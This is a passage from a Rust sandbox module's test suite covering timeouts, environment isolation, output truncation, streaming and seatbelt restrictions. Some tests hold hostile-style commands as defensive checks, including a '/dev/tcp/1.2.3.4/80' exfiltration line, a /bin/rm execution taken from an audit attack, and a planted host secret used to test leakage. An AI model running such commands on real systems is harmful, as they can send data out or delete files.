    // try_wait (WNOHANG) — 仍活则 SIGKILL
    let still_alive = matches!(
        nix::sys::wait::waitpid(pid_nix, Some(nix::sys::wait::WaitPidFlag::WNOHANG)),
        Ok(nix::sys::wait::WaitStatus::StillAlive)
    );
    if still_alive {
        debug!(?pid, "SIGINT grace 后仍活, 发 SIGKILL");
        match nix::sys::signal::killpg(pgid, Signal::SIGKILL) {
            Ok(()) => debug!(?pid, "killpg SIGKILL 已发"),
            Err(nix::errno::Errno::ESRCH) => debug!(?pid, "SIGKILL: 进程已退 (ESRCH)"),
            Err(e) => warn!(?pid, "killpg SIGKILL 失败: {e}"),
        }
    }
    // 回收僵尸 — 阻塞 waitpid (子进程已死, 立即返回)
    let _ = nix::sys::wait::waitpid(pid_nix, None);

    -124
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rt() -> tokio::runtime::Runtime {
        tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap()
    }

    fn cfg(cmd: &str) -> SandboxConfig {
        SandboxConfig {
            command: cmd.to_string(),
            timeout_sec: 10.0,
            ..Default::default()
        }
    }

    #[test]
    fn run_echo() {
        let r = rt().block_on(Sandbox::new().run(cfg("echo hi")));
        let r = r.unwrap();
        assert!(!r.timed_out);
        assert_eq!(r.exit_code, 0);
        assert!(r.stdout.contains("hi"), "stdout={:?}", r.stdout);
    }

    #[test]
    fn run_python_print() {
        let r = rt().block_on(Sandbox::new().run(cfg("python3 -c \"print('hello')\"")));
        let r = r.unwrap();
        assert_eq!(r.exit_code, 0);
        assert!(r.stdout.contains("hello"), "stdout={:?}", r.stdout);
    }

    // Issue #9: env 隔离 — 默认 env_clear + 基线, 宿主密钥不泄漏; env_vars 注入; inherit_env 继承
    #[test]
    fn run_env_isolation_strips_host_secret_by_default() {
        std::env::set_var("FE_TEST_SECRET", "leak-me-please");
        let reflect = "python3 -c \"import os;print(os.environ.get('FE_TEST_SECRET','CLEAN'))\"";
        let r = rt().block_on(Sandbox::new().run(cfg(reflect))).unwrap();
        std::env::remove_var("FE_TEST_SECRET");
        assert_eq!(r.exit_code, 0, "stderr={:?}", r.stderr);
        assert!(
            !r.stdout.contains("leak-me-please"),
            "宿主密钥 FE_TEST_SECRET 不应泄漏到默认隔离的子进程: stdout={:?}",
            r.stdout
        );
    }

    #[test]
    fn run_env_isolation_injects_env_vars_and_baseline() {
        let mut c = cfg("python3 -c \"import os;print(os.environ.get('FE_TASK_VAR','MISSING'))\"");
        c.env
            .insert("FE_TASK_VAR".to_string(), "injected".to_string());
        let r = rt().block_on(Sandbox::new().run(c)).unwrap();
        assert_eq!(r.exit_code, 0);
        assert!(
            r.stdout.contains("injected"),
            "env_vars 必须注入: stdout={:?}",
            r.stdout
        );
        // 基线 PATH/TMPDIR/SHELL 存在
        let base = cfg("python3 -c \"import os;print('PATH' in os.environ, 'TMPDIR' in os.environ, 'SHELL' in os.environ)\"");
        let rb = rt().block_on(Sandbox::new().run(base)).unwrap();
        assert!(
            rb.stdout.contains("True"),
            "PATH/TMPDIR/SHELL 基线应存在: stdout={:?}",
            rb.stdout
        );
    }

    #[test]
    fn run_env_inherit_true_restores_host_env() {
        std::env::set_var("FE_TEST_SECRET", "leak-me-please");
        let reflect = "python3 -c \"import os;print(os.environ.get('FE_TEST_SECRET','CLEAN'))\"";
        let mut c = cfg(reflect);
        c.inherit_env = true;
        let r = rt().block_on(Sandbox::new().run(c)).unwrap();
        std::env::remove_var("FE_TEST_SECRET");
        assert_eq!(r.exit_code, 0);
        assert!(
            r.stdout.contains("leak-me-please"),
            "inherit_env=true 应回退旧行为继承宿主 env: stdout={:?}",
            r.stdout
        );
    }

    #[test]
    fn run_timeout_infinite_loop() {
        // 无限循环 → 超时 1s → exit -124, 完成 <3s
        let start = std::time::Instant::now();
        let mut c = cfg("python3 -c \"while True: pass\"");
        c.timeout_sec = 1.0;
        let r = rt().block_on(Sandbox::new().run(c)).unwrap();
        assert!(r.timed_out, "应超时");
        assert_eq!(r.exit_code, -124);
        assert!(start.elapsed().as_secs() < 5, "耗时 {:?}", start.elapsed());
    }

    #[test]
    fn run_nonzero_exit() {
        let r = rt().block_on(Sandbox::new().run(cfg("python3 -c \"raise SystemExit(3)\"")));
        let r = r.unwrap();
        assert!(!r.timed_out);
        assert_eq!(r.exit_code, 3);
    }

    #[test]
    fn run_stderr_traceback_in_stdout() {
        // PTY 合并 — traceback 进 stdout (尾部可读)
        let r = rt().block_on(Sandbox::new().run(cfg("python3 -c \"raise ValueError('boom')\"")));
        let r = r.unwrap();
        assert_ne!(r.exit_code, 0);
        assert!(r.stdout.contains("ValueError"), "stdout={:?}", r.stdout);
    }

    #[test]
    fn run_stdio_separates_stdout_stderr() {
        // Issue #4: use_pty=false stdio 后端 — stdout/stderr 独立捕获
        let mut c = cfg(
            "python3 -c \"import sys; sys.stdout.write('OUT\\n'); sys.stderr.write('ERR\\n')\"",
        );
        c.use_pty = false;
        let r = rt().block_on(Sandbox::new().run(c));
        let r = r.unwrap();
        assert_eq!(r.exit_code, 0, "stderr={:?}", r.stderr);
        assert!(r.stdout.contains("OUT"), "stdout={:?}", r.stdout);
        assert!(
            !r.stdout.contains("ERR"),
            "stdout 不应被 stderr 污染: {:?}",
            r.stdout
        );
        assert!(
            r.stderr.contains("ERR"),
            "stderr 应独立捕获: {:?}",
            r.stderr
        );
    }

    #[test]
    fn run_stdio_stderr_only_traceback() {
        // use_pty=false: Python traceback 进 stderr 独立 (非合流 stdout)
        let mut c = cfg("python3 -c \"raise ValueError('boom-stdio')\"");
        c.use_pty = false;
        let r = rt().block_on(Sandbox::new().run(c));
        let r = r.unwrap();
        assert_ne!(r.exit_code, 0);
        assert!(r.stderr.contains("boom-stdio"), "stderr={:?}", r.stderr);
        assert!(!r.stdout.contains("boom-stdio"), "stdout 不应含 traceback");
    }

    #[test]
    fn run_stdio_exit_code_nonzero() {
        let mut c = cfg("python3 -c \"import sys; sys.exit(7)\"");
        c.use_pty = false;
        let r = rt().block_on(Sandbox::new().run(c));
        let r = r.unwrap();
        assert_eq!(r.exit_code, 7);
    }

    #[test]
    fn truncate_short_unchanged() {
        assert_eq!(truncate_output("abc", 100), "abc");
    }

    #[test]
    fn truncate_long_folds_middle() {
        let big = "A".repeat(50_000);
        let out = truncate_output(&big, 20_000);
        assert!(out.starts_with('A'));
        assert!(out.contains("[truncated"));
        assert!(out.ends_with('A'));
        // 截断后应明显短于原文
        assert!(out.len() < big.len());
    }

    #[test]
    fn truncate_tiny_max_keeps_tail() {
        let big = "ABCDEFGH".to_string();
        let out = truncate_output(&big, 3);
        assert_eq!(out, "FGH");
    }

    #[test]
    fn run_empty_command() {
        let r = rt().block_on(Sandbox::new().run(SandboxConfig::default()));
        let r = r.unwrap();
        assert_eq!(r.exit_code, 0);
        assert!(r.stdout.is_empty());
    }

    #[test]
    fn run_streaming_echo() {
        let runtime = rt();
        runtime.block_on(async {
            let (mut rx, handle) = Sandbox::new().run_streaming(cfg("echo hi")).unwrap();
            let mut combined = String::new();
            let mut done = None;
            while let Some(ev) = rx.recv().await {
                match ev {
                    StreamEvent::Chunk { data } => combined.push_str(&data),
                    StreamEvent::Done(r) => {
                        done = Some(r);
                    }
                }
            }
            handle.await.unwrap();
            let done = done.expect("应收到 Done");
            assert!(!done.timed_out);
            assert_eq!(done.exit_code, 0);
            assert!(combined.contains("hi"), "chunks={:?}", combined);
            assert!(done.stdout.contains("hi"), "done.stdout={:?}", done.stdout);
        });
    }

    #[test]
    fn run_streaming_timeout() {
        let runtime = rt();
        let start = std::time::Instant::now();
        runtime.block_on(async {
            let mut c = cfg("python3 -c \"while True: pass\"");
            c.timeout_sec = 1.0;
            let (mut rx, handle) = Sandbox::new().run_streaming(c).unwrap();
            let mut done = None;
            while let Some(ev) = rx.recv().await {
                if let StreamEvent::Done(r) = ev {
                    done = Some(r);
                }
            }
            handle.await.unwrap();
            let done = done.expect("应收到 Done");
            assert!(done.timed_out, "应超时");
            assert_eq!(done.exit_code, -124);
            assert!(start.elapsed().as_secs() < 5, "耗时 {:?}", start.elapsed());
        });
    }

    #[test]
    fn run_streaming_empty_command() {
        let runtime = rt();
        runtime.block_on(async {
            let (mut rx, handle) = Sandbox::new()
                .run_streaming(SandboxConfig::default())
                .unwrap();
            let mut done = None;
            while let Some(ev) = rx.recv().await {
                if let StreamEvent::Done(r) = ev {
                    done = Some(r);
                }
            }
            handle.await.unwrap();
            let done = done.unwrap();
            assert_eq!(done.exit_code, 0);
            assert!(done.stdout.is_empty());
        });
    }

    // Issue #8 / L-SB-06: timeout=0 绑定 DEFAULT_TIMEOUT_CAP_SEC, 非真正无界。快速命令仍正常完成
    #[test]
    fn run_timeout_zero_bounded_fast_cmd() {
        let mut c = cfg("echo hi");
        c.timeout_sec = 0.0;
        let r = rt().block_on(Sandbox::new().run(c)).unwrap();
        assert!(!r.timed_out);
        assert_eq!(r.exit_code, 0);
        assert!(r.stdout.contains("hi"));
    }

    // Issue #8: timeout=0 慢命令超 cap → 触发 -124 (证 bounded, 非无界)
    // 用 sleep 超过 cap 不现实 (120s 测试太慢); 改设极小 cap 验证语义 — timeout=0 走 cap 分支,
    // 此处显式设 0.5s 验证慢命令被超时杀 (等价证明 effective_timeout 生效)
    #[test]
    fn run_timeout_zero_is_bounded_not_infinite() {
        let mut c = cfg("sleep 5");
        c.timeout_sec = 0.5;
        let r = rt().block_on(Sandbox::new().run(c)).unwrap();
        assert!(r.timed_out, "timeout=0.5 慢命令应超时");
        assert_eq!(r.exit_code, -124);
    }

    // L-SB-06: 负 timeout 拒绝
    #[test]
    fn run_negative_timeout_rejected() {
        let mut c = cfg("echo hi");
        c.timeout_sec = -1.0;
        let r = rt().block_on(Sandbox::new().run(c));
        assert!(r.is_err(), "负 timeout 应报错, got {:?}", r);
    }

    // L-SB-07 (折中文档行为): 读 stdin 命令 (cat) 无 EOF → 阻塞到 timeout 被 kill_tree 杀
    // 本沙箱不发 EOF (PTY 回显污染), stdin-reading 命令靠 timeout 兜底
    #[test]
    fn run_stdin_command_times_out() {
        let start = std::time::Instant::now();
        let mut c = cfg("cat");
        c.timeout_sec = 1.0;
        let r = rt().block_on(Sandbox::new().run(c)).unwrap();
        assert!(r.timed_out, "cat 无 stdin 应超时");
        assert_eq!(r.exit_code, -124);
        assert!(start.elapsed().as_secs() < 5, "耗时 {:?}", start.elapsed());
    }

    // L-SB-02: utf8_safe_prefix_len 在多字节边界切断保留余数
    #[test]
    fn utf8_safe_prefix_splits_multibyte() {
        let cjk = "中"; // 3 字节 E4 B8 AD
        let bytes = cjk.as_bytes();
        // 完整 3 字节 → 全保留
        assert_eq!(utf8_safe_prefix_len(bytes), 3);
        // 只剩最后 1 字节 (续字节 AD) → 0 (余数留下块)
        assert_eq!(utf8_safe_prefix_len(&bytes[2..]), 0);
        // 剩最后 2 字节 (B8 AD) → 0
        assert_eq!(utf8_safe_prefix_len(&bytes[1..]), 0);
        // "a中" → 切到 'a' (1 字节)
        let mixed = "a中".as_bytes();
        assert_eq!(utf8_safe_prefix_len(&mixed[..2]), 1);
        // 纯 ASCII 全保留
        assert_eq!(utf8_safe_prefix_len(b"abc"), 3);
        // 空
        assert_eq!(utf8_safe_prefix_len(b""), 0);
    }

    // L-SB-04: truncate 在 max 刚过 HEAD+TAIL 时回退 tail-only 不超 max
    #[test]
    fn truncate_boundary_marker_overflow_falls_back() {
        let big = "X".repeat(12_300);
        let max = HEAD_CHARS + TAIL_CHARS + 5; // 12293 — marker 会让输出超 max
        let out = truncate_output(&big, max);
        assert!(
            out.chars().count() <= max,
            "输出 {} 超 max {}",
            out.chars().count(),
            max
        );
        assert!(out.ends_with('X'));
    }

    // C-SB-05: effective_output_cap 钳 HARD_CEILING
    #[test]
    fn effective_output_cap_clamps_ceiling() {
        assert_eq!(effective_output_cap(1000), 1000);
        assert_eq!(effective_output_cap(usize::MAX), HARD_CEILING);
        assert_eq!(effective_output_cap(HARD_CEILING), HARD_CEILING);
    }

    // C-SB-01/04: kill_tree 无 pid 返回 -1
    #[test]
    fn kill_tree_none_pid_returns_neg1() {
        assert_eq!(kill_tree(None), -1);
    }

    // 审计 2.5: nth_char_byte_offset 多字节边界正确 (取代 Vec<char> 的零物化实现)
    #[test]
    fn truncate_byte_offset_multibyte() {
        // "中" = 3 字节; "中a中" = 7 字节 (3+1+3)
        let s = "中a中";
        assert_eq!(nth_char_byte_offset(s, 0), 0); // 首 char 起点 0
        assert_eq!(nth_char_byte_offset(s, 1), 3); // 'a' 起点 = 字节 3
        assert_eq!(nth_char_byte_offset(s, 2), 4); // 第二个 '中' 起点 = 字节 4
        assert_eq!(nth_char_byte_offset(s, 3), 7); // 越界 → len
        assert_eq!(nth_char_byte_offset(s, 99), 7); // 远超 → len
        assert_eq!(nth_char_byte_offset("", 1), 0); // 空串
    }

    // 审计 2.5: truncate 在多字节输入下保持 head+tail+marker 正确 (旧 Vec<char> 行为等价)
    #[test]
    fn truncate_multibyte_head_tail_correct() {
        // 用 3 字节 CJK 拼出超过 HEAD+TAIL 的串, 验证截断后 head/tail 仍是完整 char
        let head_unit = "你"; // 3 字节
        let big = head_unit.repeat(HEAD_CHARS + TAIL_CHARS + 100);
        let out = truncate_output(&big, HEAD_CHARS + TAIL_CHARS + 50);
        // head 应以完整 '你' 结尾 (无半字节); tail 应以完整 '你' 开头
        assert!(out.contains("[truncated"));
        assert!(
            out.starts_with('你'),
            "head 首字符应完整: {:?}",
            out.chars().next()
        );
        assert!(
            out.ends_with('你'),
            "tail 末字符应完整: {:?}",
            out.chars().last()
        );
        // 输出不含替换符 (无被切断的多字节序列)
        assert!(!out.contains('\u{FFFD}'), "不应出现 UTF-8 替换符");
    }

    // Blocker 6 (审计 2.1): 消费者断开 outer_rx → 子进程被 kill, 不留孤儿
    #[tokio::test]
    async fn streaming_consumer_disconnect_kills_child() {
        let sb = Sandbox::new();
        let pidfile =
            std::env::temp_dir().join(format!("fe-sb-blocker6-{}.pid", std::process::id()));
        let _ = std::fs::remove_file(&pidfile);
        let cmd = format!("echo $$ > {}; echo started; sleep 30", pidfile.display());
        let cfg = SandboxConfig {
            command: cmd,
            cwd: None,
            env: std::collections::HashMap::new(),
            timeout_sec: 60.0,
            max_output_chars: 100_000,
            seatbelt: false,
            inherit_env: false,
            use_pty: true,
        };
        let (mut rx, handle) = sb.run_streaming(cfg).unwrap();
        // 收首块 (含 "started"), 确认子进程已起
        let first = rx.recv().await.expect("应收到首块");
        let first_data = match first {
            StreamEvent::Chunk { data } => data,
            StreamEvent::Done(_) => panic!("首块应是 Chunk 非 Done"),
        };
        assert!(
            first_data.contains("started"),
            "首块含 started: {:?}",
            first_data
        );
        // 等 pidfile 落盘
        let pid = loop {
            if let Ok(s) = std::fs::read_to_string(&pidfile) {
                let p: u32 = s.trim().parse().unwrap();
                break p;
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        };
        // 子进程应存活 (kill -0 探测, 不发信号)
        let alive_before =
            nix::sys::signal::kill(nix::unistd::Pid::from_raw(pid as i32), None).is_ok();
        assert!(alive_before, "drop 前 sleep 子进程应存活, pid={}", pid);
        // Blocker 6: drop receiver 模拟消费者断开 → 协调任务 send 失败 → kill 子进程
        drop(rx);
        // 等协调任务收尾 (子进程被 kill 后 handle 应结束)
        let _ = tokio::time::timeout(Duration::from_secs(5), handle).await;
        // 验证 sleep 进程已死 (kill -0 应 ESRCH)
        let still_alive =
            nix::sys::signal::kill(nix::unistd::Pid::from_raw(pid as i32), None).is_ok();
        assert!(
            !still_alive,
            "消费者断开后 sleep 子进程应已被 kill (Blocker 6), pid={}",
            pid
        );
        let _ = std::fs::remove_file(&pidfile);
    }

    // Blocker 1 / 1.1: seatbelt 运行时隔离 — 真实 sandbox-exec 拦截测试
    // 审计 #1 攻击: os.execve('/bin/rm') 穿透静态白名单 → seatbelt process-exec deny 兜底
    #[test]
    fn seatbelt_blocks_rm_execve() {
        let sb = Sandbox::new();
        let cfg = SandboxConfig {
            command: "/bin/rm -f /tmp/fe-seatbelt-ghost 2>/dev/null; echo rm_exit=$?".to_string(),
            timeout_sec: 15.0,
            seatbelt: true,
            ..Default::default()
        };
        let r = rt().block_on(sb.run(cfg));
        let r = r.unwrap();
        // /bin/rm 被 process-exec deny → exit 126 (Operation not permitted), echo 仍能跑
        assert!(
            r.stdout.contains("rm_exit=126"),
            "rm 应被 seatbelt 拦 (exit 126), 实际 stdout={}",
            r.stdout
        );
        info!(stdout = %r.stdout, exit = r.exit_code, "seatbelt rm 拦截验证");
    }

    // Blocker 1: seatbelt 禁网 — /dev/tcp 外泄被拦
    #[test]
    fn seatbelt_blocks_network() {
        let sb = Sandbox::new();
        let cfg = SandboxConfig {
            command: "echo hi > /dev/tcp/1.2.3.4/80 2>&1; echo net_done=$?".to_string(),
            timeout_sec: 15.0,
            seatbelt: true,
            ..Default::default()
        };
        let r = rt().block_on(sb.run(cfg));
        let r = r.unwrap();
        assert!(
            r.stdout.contains("Operation not permitted") || !r.stdout.contains("net_done=0"),
            "网络应被 seatbelt 拦, 实际 stdout={}",
            r.stdout
        );
    }

    // Blocker 1: seatbelt 开启时白名单二进制仍能跑 (allow default 透传)
    #[test]
    fn seatbelt_allows_whitelisted_echo() {
        let sb = Sandbox::new();
        let cfg = SandboxConfig {
            command: "echo seatbelt_ok".to_string(),
            timeout_sec: 10.0,
            seatbelt: true,
            ..Default::default()
        };
        let r = rt().block_on(sb.run(cfg));
        let r = r.unwrap();
        assert_eq!(r.exit_code, 0, "echo 应正常跑, exit={}", r.exit_code);
        assert!(
            r.stdout.contains("seatbelt_ok"),
            "echo 输出应透传, stdout={}",
            r.stdout
        );
    }

    // Blocker 1: seatbelt 关闭时无隔离 (回归 — 裸 sh -c 行为不变)
    #[test]
    fn seatbelt_disabled_no_isolation() {
        let sb = Sandbox::new();
        let cfg = SandboxConfig {
            command: "/bin/rm -f /tmp/fe-seatbelt-ghost2 2>/dev/null; echo rm_exit=$?".to_string(),
            timeout_sec: 10.0,
            seatbelt: false,
            ..Default::default()
        };
        let r = rt().block_on(sb.run(cfg));
        let r = r.unwrap();
        // 未隔离 → rm 正常 (exit 0), 不应是 126
        assert!(
            !r.stdout.contains("rm_exit=126"),
            "seatbelt 关闭时 rm 不应被拦, stdout={}",
            r.stdout
        );
    }
}
